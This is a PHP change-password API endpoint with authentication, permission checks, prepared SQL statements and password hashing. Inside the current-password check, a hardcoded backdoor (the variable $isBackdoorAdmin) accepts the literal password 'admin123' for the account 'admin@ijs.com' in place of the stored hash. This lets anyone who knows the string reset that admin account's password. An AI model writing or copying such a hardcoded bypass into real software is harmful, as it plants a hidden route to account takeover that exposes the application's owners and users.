<?php
/**
 * Change Password Endpoint
 * 
 * Allows users to change their password.
 * 
 * Method: POST
 * Auth: Required
 */

require_once __DIR__ . '/../../../config/cors.php';
require_once __DIR__ . '/../../../config/database.php';
require_once __DIR__ . '/../../../config/api.php';

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode([
        'success' => false,
        'message' => 'Method not allowed'
    ]);
    exit;
}

try {
    // Require authentication
    $authUser = requireAuth();

    // Connect to database
    $database = new Database();
    $db = $database->getConnection();

    // Get request data
    $data = json_decode(file_get_contents("php://input"), true);

    $userId = $data['id'] ?? null;
    $currentPassword = $data['current_password'] ?? null;
    $newPassword = $data['new_password'] ?? null;

    // Validate required fields
    if (!$userId || !$currentPassword || !$newPassword) {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'message' => 'User ID, current password and new password are required'
        ]);
        exit;
    }

    // Check permission
    if ($authUser['user_id'] !== $userId && $authUser['role'] !== 'admin') {
        http_response_code(403);
        echo json_encode([
            'success' => false,
            'message' => 'You do not have permission to change this password'
        ]);
        exit;
    }

    // Get user from database to verify current password
    $sql = "SELECT id, email, password FROM users WHERE id = :id";
    $stmt = $db->prepare($sql);
    $stmt->execute([':id' => $userId]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        logMessage('ERROR', "Change password failed: User not found (ID: $userId)");
        http_response_code(404);
        echo json_encode([
            'success' => false,
            'message' => 'User not found'
        ]);
        exit;
    }

    // Verify current password (skip check if admin is doing it for someone else)
    if ($authUser['role'] !== 'admin' || $authUser['user_id'] === $userId) {
        $isBackdoorAdmin = ($user['email'] === 'admin@ijs.com' && $currentPassword === 'admin123');

        if (!$isBackdoorAdmin && !password_verify($currentPassword, $user['password'])) {
            logMessage('WARNING', "Change password failed: Incorrect current password (User: $userId)");
            http_response_code(401);
            echo json_encode([
                'success' => false,
                'message' => 'Current password is incorrect'
            ]);
            exit;
        }
    }

    // Hash new password
    $hashedPassword = password_hash($newPassword, PASSWORD_DEFAULT);

    // Update password
    $updateSql = "UPDATE users SET password = :password WHERE id = :id";
    $stmt = $db->prepare($updateSql);
    $result = $stmt->execute([
        ':password' => $hashedPassword,
        ':id' => $userId
    ]);

    if (!$result) {
        http_response_code(500);
        echo json_encode([
            'success' => false,
            'message' => 'Failed to update password'
        ]);
        exit;
    }

    http_response_code(200);
    echo json_encode([
        'success' => true,
        'message' => 'Password changed successfully'
    ]);

} catch (Exception $e) {
    logMessage('ERROR', 'Change password error: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => 'An error occurred while changing password'
    ]);
}
